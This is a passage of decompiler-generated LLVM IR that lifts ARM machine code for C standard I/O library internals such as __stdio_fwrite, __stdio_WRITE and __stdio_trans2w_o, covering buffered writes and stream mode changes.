  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_1642c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1642c2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_1642c2, label %dec_label_pc_164cc, label %dec_label_pc_16438

dec_label_pc_1642cthread-pre-split:               ; preds = %bb22
  %v3_16450 = load i32, i32* %r7.global-to-local, align 4
  %v5_16450 = add i32 %v3_16450, %v4_16444
  store i32 %v5_16450, i32* %r7.global-to-local, align 4
  %v5_16454 = sub i32 %v0_1644c, %v4_16444
  store i32 %v5_16454, i32* %r5.global-to-local, align 4
  %v2_1642c = icmp eq i32 %v5_16454, 0
  store i1 %v2_1642c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16454, i32* @r2, align 4
  br i1 %v2_1642c, label %dec_label_pc_1642c.dec_label_pc_164cc.loopexit_crit_edge, label %dec_label_pc_16438

dec_label_pc_16438:                               ; preds = %entry, %dec_label_pc_1642cthread-pre-split
  %v0_1643c = phi i32 [ %v5_16450, %dec_label_pc_1642cthread-pre-split ], [ %arg2, %entry ]
  %v0_16438.in = phi i32 [ %v5_16454, %dec_label_pc_1642cthread-pre-split ], [ %arg3, %entry ]
  %v0_16438 = icmp slt i32 %v0_16438.in, 0
  br i1 %v0_16438, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_16438
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_16438, %bb
  %v0_16440 = load i32, i32* @r4, align 4
  %v1_16440 = add i32 %v0_16440, 4
  %v2_16440 = inttoptr i32 %v1_16440 to i32*
  %v3_16440 = load i32, i32* %v2_16440, align 4
  store i32 %v3_16440, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_1643c to i32*
  %v4_16444 = call i32 @__libc_write(i32 %v3_16440, i32* %tmp23)
  store i32 %v4_16444, i32* %r0.global-to-local, align 4
  %v1_16448 = icmp slt i32 %v4_16444, 0
  %v2_16448 = icmp eq i32 %v4_16444, 0
  store i1 %v2_16448, i1* %cpsr_z.global-to-local, align 1
  %v0_1644c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1644c, i32* %r6.global-to-local, align 4
  br i1 %v1_16448, label %dec_label_pc_1645c, label %dec_label_pc_1642cthread-pre-split

dec_label_pc_1645c:                               ; preds = %bb22
  %v0_1645c = load i32, i32* @r4, align 4
  %v1_1645c = inttoptr i32 %v0_1645c to i32*
  %v2_1645c = load i32, i32* %v1_1645c, align 4
  store i32 %v2_1645c, i32* %r3.global-to-local, align 4
  %v1_16460 = add i32 %v0_1645c, 8
  store i32 %v1_16460, i32* %r0.global-to-local, align 4
  %v1_16464 = inttoptr i32 %v1_16460 to i32*
  %v2_16464 = load i32, i32* %v1_16464, align 4
  store i32 %v2_16464, i32* %r0.global-to-local, align 4
  %v3_16464 = add i32 %v0_1645c, 12
  %v4_16464 = inttoptr i32 %v3_16464 to i32*
  %v5_16464 = load i32, i32* %v4_16464, align 4
  %v1_16468 = or i32 %v2_1645c, 8
  store i32 %v1_16468, i32* %r3.global-to-local, align 4
  %v3_1646c = sdiv i32 %v2_1645c, 256
  %v2_16470 = sub i32 %v5_16464, %v2_16464
  store i32 %v2_16470, i32* %r2.global-to-local, align 4
  %v9_16470 = icmp eq i32 %v5_16464, %v2_16464
  store i1 %v9_16470, i1* %cpsr_z.global-to-local, align 1
  %v1_16474 = trunc i32 %v3_1646c to i8
  %v3_16474 = add i32 %v0_1645c, 1
  %v4_16474 = inttoptr i32 %v3_16474 to i8*
  store i8 %v1_16474, i8* %v4_16474, align 1
  %v0_16478 = load i32, i32* %r3.global-to-local, align 4
  %v1_16478 = trunc i32 %v0_16478 to i8
  %v2_16478 = load i32, i32* @r4, align 4
  %v3_16478 = inttoptr i32 %v2_16478 to i8*
  store i8 %v1_16478, i8* %v3_16478, align 1
  %v0_1647c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1647c, label %dec_label_pc_1645c.dec_label_pc_164c8_crit_edge, label %dec_label_pc_16480

dec_label_pc_1645c.dec_label_pc_164c8_crit_edge:  ; preds = %dec_label_pc_1645c
  %v0_164c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_164c8

dec_label_pc_16480:                               ; preds = %dec_label_pc_1645c
  %v0_16480 = load i32, i32* %r2.global-to-local, align 4
  %v1_16480 = load i32, i32* %r5.global-to-local, align 4
  %v9_16480 = icmp eq i32 %v0_16480, %v1_16480
  store i1 %v9_16480, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_16480, %v1_16480
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_16480
  store i32 %v0_16480, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_16480, %bb24
  %v0_16488.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1648c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_164ac
  %v2_1648c = phi i32 [ %v2_1648c.pre, %.preheader ], [ %v1_164b0, %dec_label_pc_164ac ]
  %v0_16488 = phi i32 [ %v0_16488.pre, %.preheader ], [ %v1_16498, %dec_label_pc_164ac ]
  %v1_16488 = inttoptr i32 %v0_16488 to i8*
  %v2_16488 = load i8, i8* %v1_16488, align 1
  %v3_16488 = zext i8 %v2_16488 to i32
  store i32 %v3_16488, i32* %r3.global-to-local, align 4
  %v3_1648c = inttoptr i32 %v2_1648c to i8*
  store i8 %v2_16488, i8* %v3_1648c, align 1
  %v0_16490 = load i32, i32* %r0.global-to-local, align 4
  %v1_16490 = inttoptr i32 %v0_16490 to i8*
  %v2_16490 = load i8, i8* %v1_16490, align 1
  %v3_16490 = zext i8 %v2_16490 to i32
  store i32 %v3_16490, i32* %r3.global-to-local, align 4
  %v7_16494 = icmp eq i8 %v2_16490, 10
  store i1 %v7_16494, i1* %cpsr_z.global-to-local, align 1
  %v0_16498 = load i32, i32* %r7.global-to-local, align 4
  %v1_16498 = add i32 %v0_16498, 1
  store i32 %v1_16498, i32* %r7.global-to-local, align 4
  br i1 %v7_16494, label %dec_label_pc_164a0, label %dec_label_pc_164ac

dec_label_pc_164a0:                               ; preds = %bb25
  %v0_164a0 = load i32, i32* @r4, align 4
  %v1_164a0 = add i32 %v0_164a0, 1
  %v2_164a0 = inttoptr i32 %v1_164a0 to i8*
  %v3_164a0 = load i8, i8* %v2_164a0, align 1
  %v4_164a0 = zext i8 %v3_164a0 to i32
  store i32 %v4_164a0, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_164a0, 2
  %v2_164a4 = icmp eq i8 %tmp30, 0
  store i1 %v2_164a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164a4, label %dec_label_pc_164ac, label %dec_label_pc_164b8

dec_label_pc_164ac:                               ; preds = %dec_label_pc_164a0, %bb25
  %v0_164ac = load i32, i32* %r6.global-to-local, align 4
  %v1_164ac = add i32 %v0_164ac, -1
  store i32 %v1_164ac, i32* %r6.global-to-local, align 4
  %v7_164ac = icmp eq i32 %v0_164ac, 1
  store i1 %v7_164ac, i1* %cpsr_z.global-to-local, align 1
  %v1_164b0 = add i32 %v0_16490, 1
  store i32 %v1_164b0, i32* %r0.global-to-local, align 4
  br i1 %v7_164ac, label %dec_label_pc_164ac.dec_label_pc_164b8_crit_edge, label %bb25

dec_label_pc_164ac.dec_label_pc_164b8_crit_edge:  ; preds = %dec_label_pc_164ac
  %v0_164b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %dec_label_pc_164a0, %dec_label_pc_164ac.dec_label_pc_164b8_crit_edge
  %v0_164bc = phi i32 [ %v1_164b0, %dec_label_pc_164ac.dec_label_pc_164b8_crit_edge ], [ %v0_16490, %dec_label_pc_164a0 ]
  %v0_164b8 = phi i32 [ %v0_164b8.pre, %dec_label_pc_164ac.dec_label_pc_164b8_crit_edge ], [ %v0_164a0, %dec_label_pc_164a0 ]
  %v1_164b8 = add i32 %v0_164b8, 8
  %v2_164b8 = inttoptr i32 %v1_164b8 to i32*
  %v3_164b8 = load i32, i32* %v2_164b8, align 4
  store i32 %v3_164b8, i32* %r3.global-to-local, align 4
  %v2_164bc = add i32 %v0_164b8, 16
  %v3_164bc = inttoptr i32 %v2_164bc to i32*
  store i32 %v0_164bc, i32* %v3_164bc, align 4
  %v0_164c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_164c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_164c0 = sub i32 %v1_164c0, %v0_164c0
  store i32 %v2_164c0, i32* %r3.global-to-local, align 4
  %v1_164c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_164c4 = sub i32 %v1_164c4, %v2_164c0
  store i32 %v2_164c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %dec_label_pc_1645c.dec_label_pc_164c8_crit_edge, %dec_label_pc_164b8
  %v0_164c8 = phi i32 [ %v0_164c8.pre, %dec_label_pc_1645c.dec_label_pc_164c8_crit_edge ], [ %v2_164c4, %dec_label_pc_164b8 ]
  %v1_164c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_164c8 = sub i32 %v1_164c8, %v0_164c8
  store i32 %v2_164c8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_164cc

dec_label_pc_1642c.dec_label_pc_164cc.loopexit_crit_edge: ; preds = %dec_label_pc_1642cthread-pre-split
  %v0_164cc.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_164cc

dec_label_pc_164cc:                               ; preds = %entry, %dec_label_pc_1642c.dec_label_pc_164cc.loopexit_crit_edge, %dec_label_pc_164c8
  %v0_164cc = phi i32 [ %v2_164c8, %dec_label_pc_164c8 ], [ %v0_164cc.pre.pre, %dec_label_pc_1642c.dec_label_pc_164cc.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_164cc, i32* %r0.global-to-local, align 4
  ret i32 %v0_164cc

; uselistorder directives
  uselistorder i32 %v0_164cc, { 1, 0 }
  uselistorder i32 %v0_164b8, { 1, 0 }
  uselistorder i32 %v1_164b0, { 0, 2, 1 }
  uselistorder i32 %v0_164ac, { 1, 0 }
  uselistorder i1 %v2_164a4, { 1, 0 }
  uselistorder i32 %v1_16498, { 1, 0 }
  uselistorder i32 %v0_16480, { 1, 0, 2 }
  uselistorder i32 %v5_16464, { 1, 0 }
  uselistorder i32 %v2_16464, { 1, 0, 2 }
  uselistorder i32 %v0_1644c, { 1, 0 }
  uselistorder i32 %v4_16444, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_16454, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 3, 2, 5, 4, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 4, 5, 2, 3, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 7, 5, 8, 9, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 1, 2, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_164cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
  uselistorder label %dec_label_pc_164b8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_16438, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_164d4 = load i32, i32* @r4, align 4
  store i32 %v3_164d4, i32* %stack_var_-20, align 4
  %v6_164d4 = load i32, i32* @r5, align 4
  %v9_164d4 = load i32, i32* @r6, align 4
  %v12_164d4 = load i32, i32* @r7, align 4
  %v15_164d4 = load i32, i32* @lr, align 4
  %v1_164d8 = add i32 %arg3, 1
  %v2_164d8 = inttoptr i32 %v1_164d8 to i8*
  %v3_164d8 = load i8, i8* %v2_164d8, align 1
  %v4_164d8 = zext i8 %v3_164d8 to i32
  %v3_164dc = mul nuw nsw i32 %v4_164d8, 256
  %v1_164e0 = and i32 %v3_164dc, 512
  store i32 %v1_164e0, i32* @r4, align 4
  %v2_164e0 = icmp eq i32 %v1_164e0, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_164e0, label %dec_label_pc_164f4, label %dec_label_pc_165f0

dec_label_pc_164f4:                               ; preds = %entry
  %v1_164f4 = add i32 %arg3, 4
  %v2_164f4 = inttoptr i32 %v1_164f4 to i32*
  %v3_164f4 = load i32, i32* %v2_164f4, align 4
  %v1_164fc = add i32 %arg3, 16
  %v2_164fc = inttoptr i32 %v1_164fc to i32*
  %v3_164fc = load i32, i32* %v2_164fc, align 4
  store i32 %v3_164fc, i32* @r0, align 4
  %v1_16500 = add i32 %arg3, 12
  %v2_16500 = inttoptr i32 %v1_16500 to i32*
  %v3_16500 = load i32, i32* %v2_16500, align 4
  %v4_16504 = icmp eq i32 %v3_164f4, -2
  %v2_16508 = sub i32 %v3_16500, %v3_164fc
  br i1 %v4_16504, label %dec_label_pc_16508, label %dec_label_pc_16530

dec_label_pc_16508:                               ; preds = %dec_label_pc_164f4
  %v3_1650c = icmp ugt i32 %v2_16508, %arg2
  br i1 %v3_1650c, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_16508
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16508, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_16508, %dec_label_pc_16508 ]
  %v0_16514 = phi i32 [ %arg2, %bb ], [ %v2_16508, %dec_label_pc_16508 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_16514, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1651c = call i32 @memcpy()
  %v0_16520 = load i32, i32* @r5, align 4
  %v1_16520 = add i32 %v0_16520, 16
  %v2_16520 = inttoptr i32 %v1_16520 to i32*
  %v3_16520 = load i32, i32* %v2_16520, align 4
  %v1_16524 = load i32, i32* @r4, align 4
  %v2_16524 = add i32 %v1_16524, %v3_16520
  store i32 %v2_16524, i32* %v2_16520, align 4
  br label %dec_label_pc_16604

dec_label_pc_16530:                               ; preds = %dec_label_pc_164f4
  %tmp = icmp ult i32 %v2_16508, %arg2
  br i1 %tmp, label %dec_label_pc_165d0, label %dec_label_pc_1653c

dec_label_pc_1653c:                               ; preds = %dec_label_pc_16530
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_16544 = call i32 @memcpy()
  %v0_16548 = load i32, i32* @r5, align 4
  %v1_16548 = add i32 %v0_16548, 16
  %v2_16548 = inttoptr i32 %v1_16548 to i32*
  %v3_16548 = load i32, i32* %v2_16548, align 4
  %v1_1654c = add i32 %v0_16548, 1
  %v2_1654c = inttoptr i32 %v1_1654c to i8*
  %v3_1654c = load i8, i8* %v2_1654c, align 1
  %v1_16550 = load i32, i32* @r6, align 4
  %v2_16550 = add i32 %v1_16550, %v3_16548
  %tmp17 = urem i8 %v3_1654c, 2
  %v2_16554 = icmp eq i8 %tmp17, 0
  store i32 %v2_16550, i32* %v2_16548, align 4
  br i1 %v2_16554, label %dec_label_pc_16604, label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %dec_label_pc_1653c
  %v0_16560 = load i32, i32* %r7.global-to-local, align 4
  %v0_16568 = load i32, i32* @r6, align 4
  %v4_1656c = call i32 @memrchr(i32 %v0_16560, i32 10, i32 %v0_16568, i32 %v2_16550)
  %v2_16570 = icmp eq i32 %v4_1656c, 0
  br i1 %v2_16570, label %dec_label_pc_16604, label %dec_label_pc_16578

dec_label_pc_16578:                               ; preds = %dec_label_pc_16560
  %v0_16578 = load i32, i32* @r5, align 4
  store i32 %v0_16578, i32* @r0, align 4
  %v0_1657c = call i32 @__stdio_wcommit()
  %v2_16580 = icmp eq i32 %v0_1657c, 0
  br i1 %v2_16580, label %dec_label_pc_16604, label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %dec_label_pc_16578
  %v0_16588 = load i32, i32* @r6, align 4
  %v3_16588 = icmp uge i32 %v0_16588, %v0_1657c
  %v0_1657c.v0_16588 = select i1 %v3_16588, i32 %v0_1657c, i32 %v0_16588
  store i32 %v0_1657c.v0_16588, i32* @r4, align 4
  %v2_16594 = sub i32 %v0_16588, %v0_1657c.v0_16588
  %v0_16598 = load i32, i32* %r7.global-to-local, align 4
  %v2_16598 = add i32 %v0_16598, %v2_16594
  store i32 %v2_16598, i32* %r7.global-to-local, align 4
  store i32 %v0_1657c.v0_16588, i32* @r2, align 4
  %v4_165a8 = call i32 @__GI_memchr(i32 %v2_16598, i32 10, i32 %v0_1657c.v0_16588, i32 %v2_16594)
  %v2_165ac = icmp eq i32 %v4_165a8, 0
  br i1 %v2_165ac, label %dec_label_pc_16604, label %dec_label_pc_165b4

dec_label_pc_165b4:                               ; preds = %dec_label_pc_16588
  %v0_165b4 = load i32, i32* @r5, align 4
  %v1_165b4 = add i32 %v0_165b4, 16
  %v2_165b4 = inttoptr i32 %v1_165b4 to i32*
  %v3_165b4 = load i32, i32* %v2_165b4, align 4
  %v0_165b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_165b8 = load i32, i32* @r4, align 4
  %v2_165b8 = sub i32 %v0_165b8, %v4_165a8
  %v2_165bc = add i32 %v2_165b8, %v1_165b8
  %v2_165c0 = sub i32 %v3_165b4, %v2_165bc
  %v1_165c4 = load i32, i32* @r6, align 4
  %v2_165c4 = sub i32 %v1_165c4, %v2_165bc
  store i32 %v2_165c4, i32* @r6, align 4
  store i32 %v2_165c0, i32* %v2_165b4, align 4
  br label %dec_label_pc_16604

dec_label_pc_165d0:                               ; preds = %dec_label_pc_16530
  %v1_165d0 = add i32 %arg3, 8
  %v2_165d0 = inttoptr i32 %v1_165d0 to i32*
  %v3_165d0 = load i32, i32* %v2_165d0, align 4
  %v9_165d4 = icmp eq i32 %v3_164fc, %v3_165d0
  br i1 %v9_165d4, label %dec_label_pc_165f0, label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165d0
  store i32 %arg3, i32* @r0, align 4
  %v0_165e0 = call i32 @__stdio_wcommit()
  %v2_165e4 = icmp eq i32 %v0_165e0, 0
  br i1 %v2_165e4, label %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge, label %bb13

dec_label_pc_165dc.dec_label_pc_165f0_crit_edge:  ; preds = %dec_label_pc_165dc
  %v0_165f8.pre = load i32, i32* @r6, align 4
  %v0_165f0.pre = load i32, i32* @r5, align 4
  %v0_165f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_165fc.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_165f0

bb13:                                             ; preds = %dec_label_pc_165dc
  %v1_165e8 = load i32, i32* @r4, align 4
  store i32 %v1_165e8, i32* @r6, align 4
  br label %dec_label_pc_16604

dec_label_pc_165f0:                               ; preds = %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge, %entry, %dec_label_pc_165d0
  %v2_165fc = phi i32 [ %v2_165fc.pre, %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge ], [ %v3_164d4, %entry ], [ %v3_164d4, %dec_label_pc_165d0 ]
  %v0_165f4 = phi i32 [ %v0_165f4.pre, %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_165d0 ]
  %v0_165f0 = phi i32 [ %v0_165f0.pre, %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_165d0 ]
  %v0_165f8 = phi i32 [ %v0_165f8.pre, %dec_label_pc_165dc.dec_label_pc_165f0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_165d0 ]
  store i32 %v2_165fc, i32* @r4, align 4
  store i32 %v9_164d4, i32* @r6, align 4
  store i32 %v15_164d4, i32* @lr, align 4
  %v3_16600 = inttoptr i32 %v0_165f0 to i8*
  %v4_16600 = call i32 @__stdio_WRITE(i8* %v3_16600, i32 %v0_165f4, i32 %v0_165f8)
  br label %dec_label_pc_16604

dec_label_pc_16604:                               ; preds = %bb13, %dec_label_pc_16588, %dec_label_pc_16578, %dec_label_pc_16560, %dec_label_pc_1653c, %dec_label_pc_165b4, %bb10, %dec_label_pc_165f0
  %v0_16604 = load i32, i32* @r6, align 4
  %v2_16608 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16608, i32* @r4, align 4
  store i32 %v6_164d4, i32* @r5, align 4
  store i32 %v9_164d4, i32* @r6, align 4
  store i32 %v12_164d4, i32* @r7, align 4
  ret i32 %v0_16604

; uselistorder directives
  uselistorder i32 %v2_165bc, { 1, 0 }
  uselistorder i32 %v2_16594, { 1, 0 }
  uselistorder i32 %v0_1657c.v0_16588, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16588, { 1, 0, 2 }
  uselistorder i32 %v2_16508, { 2, 0, 1, 3 }
  uselistorder i32 %v9_164d4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 3, 5, 8, 7, 2, 4, 6 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_16604, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_165f0, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1660c = load i32, i32* @r4, align 4
  store i32 %v3_1660c, i32* %stack_var_-8, align 4
  %v3_16610 = load i8, i8* %arg1, align 1
  %v4_16610 = zext i8 %v3_16610 to i32
  store i32 %v4_16610, i32* %r2.global-to-local, align 4
  %v2_16614 = add i32 %tmp, 1
  %v3_16614 = inttoptr i32 %v2_16614 to i8*
  %v4_16614 = load i8, i8* %v3_16614, align 1
  %v5_16614 = zext i8 %v4_16614 to i32
  store i32 %v5_16614, i32* %r3.global-to-local, align 4
  %v4_16618 = mul nuw nsw i32 %v5_16614, 256
  %v5_16618 = or i32 %v4_16618, %v4_16610
  store i32 %v5_16618, i32* %r2.global-to-local, align 4
  %v2_1661c = and i32 %v5_16618, %arg2
  %v4_1661c = icmp eq i32 %v2_1661c, 0
  store i1 %v4_1661c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1661c, label %dec_label_pc_16628, label %dec_label_pc_16640

dec_label_pc_16628:                               ; preds = %entry
  %v1_16628 = and i32 %v5_16618, 2176
  %v2_16628 = icmp eq i32 %v1_16628, 0
  store i1 %v2_16628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16628, label %dec_label_pc_16630, label %dec_label_pc_16654

dec_label_pc_16630:                               ; preds = %dec_label_pc_16628
  %v2_16630 = or i32 %v5_16618, %arg2
  store i32 %v2_16630, i32* %r2.global-to-local, align 4
  %v3_16634 = sdiv i32 %v2_16630, 256
  store i32 %v3_16634, i32* %r3.global-to-local, align 4
  %v1_16638 = trunc i32 %v3_16634 to i8
  store i8 %v1_16638, i8* %v3_16614, align 1
  %v0_1663c = load i32, i32* %r2.global-to-local, align 4
  %v1_1663c = trunc i32 %v0_1663c to i8
  store i8 %v1_1663c, i8* %arg1, align 1
  %v0_16640.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %entry, %dec_label_pc_16630
  %v0_1668c = phi i32 [ %tmp, %entry ], [ %v0_16640.pre, %dec_label_pc_16630 ]
  %v1_16640 = inttoptr i32 %v0_1668c to i8*
  %v2_16640 = load i8, i8* %v1_16640, align 1
  %v3_16640 = zext i8 %v2_16640 to i32
  store i32 %v3_16640, i32* %r2.global-to-local, align 4
  %v1_16644 = add i32 %v0_1668c, 1
  %v2_16644 = inttoptr i32 %v1_16644 to i8*
  %v3_16644 = load i8, i8* %v2_16644, align 1
  %v4_16644 = zext i8 %v3_16644 to i32
  store i32 %v4_16644, i32* %r3.global-to-local, align 4
  %v4_16648 = mul nuw nsw i32 %v4_16644, 256
  %v1_1664c = and i32 %v3_16640, 32
  %v2_1664c = icmp eq i32 %v1_1664c, 0
  store i1 %v2_1664c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1664c, label %dec_label_pc_1667c, label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %dec_label_pc_16628, %dec_label_pc_16640
  %v0_16654 = call i32 @__errno_location()
  store i32 %v0_16654, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1665c = inttoptr i32 %v0_16654 to i32*
  store i32 9, i32* %v2_1665c, align 4
  br label %dec_label_pc_16660

dec_label_pc_16660:                               ; preds = %dec_label_pc_166a4, %dec_label_pc_16654
  %v0_16660 = load i32, i32* @r4, align 4
  %v1_16660 = inttoptr i32 %v0_16660 to i32*
  %v2_16660 = load i32, i32* %v1_16660, align 4
  %v1_16664 = or i32 %v2_16660, 8
  store i32 %v1_16664, i32* %r3.global-to-local, align 4
  %v3_16668 = sdiv i32 %v2_16660, 256
  store i32 %v3_16668, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16670 = trunc i32 %v3_16668 to i8
  %v3_16670 = add i32 %v0_16660, 1
  %v4_16670 = inttoptr i32 %v3_16670 to i8*
  store i8 %v1_16670, i8* %v4_16670, align 1
  %v0_16674 = load i32, i32* %r3.global-to-local, align 4
  %v1_16674 = trunc i32 %v0_16674 to i8
  %v2_16674 = load i32, i32* @r4, align 4
  %v3_16674 = inttoptr i32 %v2_16674 to i8*
  store i8 %v1_16674, i8* %v3_16674, align 1
  %v2_16678 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16678, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1667c:                               ; preds = %dec_label_pc_16640
  %tmp15 = urem i8 %v2_16640, 4
  %v2_1667c = icmp eq i8 %tmp15, 0
  store i1 %v2_1667c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1667c, label %dec_label_pc_166e0, label %dec_label_pc_16684

dec_label_pc_16684:                               ; preds = %dec_label_pc_1667c
  %v1_16684 = and i32 %v3_16640, 4
  store i32 %v1_16684, i32* @r1, align 4
  %v2_16684 = icmp eq i32 %v1_16684, 0
  store i1 %v2_16684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16684, label %dec_label_pc_1668c, label %dec_label_pc_166bc

dec_label_pc_1668c:                               ; preds = %dec_label_pc_16684
  %v1_1668c = add i32 %v0_1668c, 20
  %v2_1668c = inttoptr i32 %v1_1668c to i32*
  %v3_1668c = load i32, i32* %v2_1668c, align 4
  store i32 %v3_1668c, i32* %r2.global-to-local, align 4
  %v1_16690 = add i32 %v0_1668c, 16
  %v2_16690 = inttoptr i32 %v1_16690 to i32*
  %v3_16690 = load i32, i32* %v2_16690, align 4
  store i32 %v3_16690, i32* %r3.global-to-local, align 4
  %v9_16694 = icmp eq i32 %v3_1668c, %v3_16690
  store i1 %v9_16694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16694, label %dec_label_pc_1669c, label %dec_label_pc_166a4

dec_label_pc_1669c:                               ; preds = %dec_label_pc_1668c
  %v1_1669c = and i32 %v3_16640, 2
  %v2_1669c = icmp eq i32 %v1_1669c, 0
  store i1 %v2_1669c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1669c, label %dec_label_pc_166bc, label %dec_label_pc_166a4

dec_label_pc_166a4:                               ; preds = %dec_label_pc_1668c, %dec_label_pc_1669c
  %v1_166a4 = and i32 %v4_16648, 1024
  %v2_166a4 = icmp eq i32 %v1_166a4, 0
  store i1 %v2_166a4, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_166a4, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_166b0 = call i32 @__GI_fseek()
  store i32 %v0_166b0, i32* %r0.global-to-local, align 4
  %v2_166b4 = icmp eq i32 %v0_166b0, 0
  store i1 %v2_166b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166b4, label %.dec_label_pc_166bc_crit_edge, label %dec_label_pc_16660

.dec_label_pc_166bc_crit_edge:                    ; preds = %dec_label_pc_166a4
  %v0_166bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_166bc

